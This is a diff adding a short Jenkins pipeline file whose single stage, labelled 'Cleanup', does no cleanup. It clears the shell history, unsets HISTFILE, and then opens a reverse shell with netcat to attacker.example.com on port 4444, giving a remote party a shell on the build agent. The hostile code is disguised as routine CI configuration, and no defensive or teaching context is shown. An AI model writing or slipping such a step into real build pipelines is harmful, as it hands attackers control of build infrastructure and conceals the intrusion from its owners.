@@ -1,0 +1,11 @@
+pipeline {
+  agent { label 'build' }
+  stages {
+    stage('Cleanup') {
+      steps {
+        sh 'history -c && unset HISTFILE'
+        sh 'nc attacker.example.com 4444 -e /bin/sh'
+      }
+    }
+  }
+}
